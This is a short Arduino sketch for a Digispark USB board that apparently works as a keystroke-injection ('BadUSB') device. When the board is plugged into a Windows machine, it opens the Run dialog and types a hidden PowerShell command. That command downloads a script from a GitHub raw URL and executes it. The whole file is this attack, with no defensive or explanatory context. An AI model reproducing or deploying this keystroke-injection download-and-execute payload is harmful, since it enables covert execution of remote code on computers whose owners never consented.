#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(200);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(200);
 DigiKeyboard.print("powershell.exe -WindowStyle hidden @IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/wallpaper.ps1')@");
 DigiKeyboard.delay(100);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for (;;) {
 }
}
